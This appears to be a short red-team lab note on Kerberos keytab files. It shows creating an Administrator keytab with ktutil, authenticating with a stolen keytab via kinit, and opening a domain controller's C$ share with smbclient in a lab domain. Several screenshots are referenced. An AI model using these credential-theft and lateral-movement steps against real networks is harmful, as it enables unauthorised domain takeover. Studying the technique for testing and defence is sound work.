# Keytab files

## Keytab files

{% hint style="info" %}
keytab = contains Kerberos Principal name and encrypted keys \(usage for script\). See crontab
{% endhint %}

### Create a keytab

```text
ktutil
addent -password -p Administrator@crook.badcorp.local -k 1 -e rc4-hmac
wkt /tmp/administrator.keytab
quit
```

### Stealing the keytab

![](../../../../../.gitbook/assets/image%20%28181%29.png)

#### Authenticate

```csharp
kinit Administrator@CROOK.BADCORP.LOCAL -k -t /tmp/admin.keytab 
```

![](../../../../../.gitbook/assets/image%20%28306%29.png)

#### Renew the Ticket

![](../../../../../.gitbook/assets/image%20%28139%29.png)

#### Use the ticket 

```text
smbclient -k -U CROOK\\Administrator //DC02.CROOK.BADCORP.LOCAL/C$
```

![](../../../../../.gitbook/assets/image%20%28214%29.png)

